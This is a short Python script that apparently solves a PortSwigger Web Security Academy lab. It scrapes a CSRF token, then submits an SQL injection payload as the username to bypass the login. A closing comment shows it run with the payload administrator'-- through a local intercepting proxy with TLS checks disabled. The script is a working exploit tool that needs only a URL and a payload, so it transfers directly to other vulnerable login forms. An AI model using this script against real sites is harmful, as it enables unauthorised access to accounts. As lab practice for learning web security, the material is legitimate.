import requests
import urllib3
import sys
from bs4 import BeautifulSoup

# Disable any request warning when running our request
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def get_csrf_token(s,url):
    r = s.get(url, verify=False , proxies={"http":"http://127.0.0.1:8080"})
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    #print ("Session s: "+str(s))
    #print ("csrf token: " + csrf )
    return csrf

def exploit_sqli(s,url, payload):
    # First get csrf token
    csrf = get_csrf_token(s,url)
    data = {"csrf":csrf,
            "username": payload,
            "password": "random"
            }
    r = s.post(url, data=data, verify=False, proxies={"http":"http://127.0.0.1:8080"})
    result = r.text
    if "Log out" in result:
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    
    except IndexError:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])   
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(100)

    s = requests.Session()

    if exploit_sqli(s,url, payload):
        print ("[+] SQLi Successful! :)")
    else:
        print ("[-] SQLi Unsuccessful :(")

#┌──(pwncat-env)─(kali㉿kalibth)-[~/Documents/htb/coding]
#└─$ python3 portswigger-sqli-lab02.py "https://ac001fdc1e9baa9cc03295ff0006003b.web-security-academy.net/login" "administrator'--"